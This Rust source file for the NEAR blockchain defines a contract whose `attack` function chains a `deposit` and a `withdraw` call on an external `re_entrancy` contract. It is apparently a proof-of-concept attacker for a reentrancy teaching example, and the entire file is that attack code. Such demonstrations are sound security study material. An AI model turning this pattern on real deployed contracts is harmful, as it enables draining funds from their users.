use near_sdk::borsh::{self, BorshDeserialize, BorshSerialize};
use near_sdk::{near_bindgen, env, AccountId, PanicOnDefault, Gas, require};

pub mod external;
pub use crate::external::*;

const GAS_FOR_WITHDRAW: Gas = Gas(2_000_000_000_000);
const GAS_FOR_CALLBACK: Gas = Gas(21_000_000_000_000 + GAS_FOR_WITHDRAW.0);

#[near_bindgen]
#[derive(PanicOnDefault, BorshDeserialize, BorshSerialize)]
pub struct Contract {}

#[near_bindgen]
impl Contract {

    #[payable]
    pub fn attack(receiver_id: AccountId, callback_id: AccountId) {
        require!(env::prepaid_gas() > GAS_FOR_CALLBACK, "More gas is required");

        re_entrancy::ext(receiver_id.clone())
            .with_attached_deposit(5)
            .with_static_gas(env::prepaid_gas() - GAS_FOR_WITHDRAW)
            .deposit(callback_id);

        re_entrancy::ext(receiver_id.clone()).with_static_gas(GAS_FOR_WITHDRAW).withdraw();
    }
}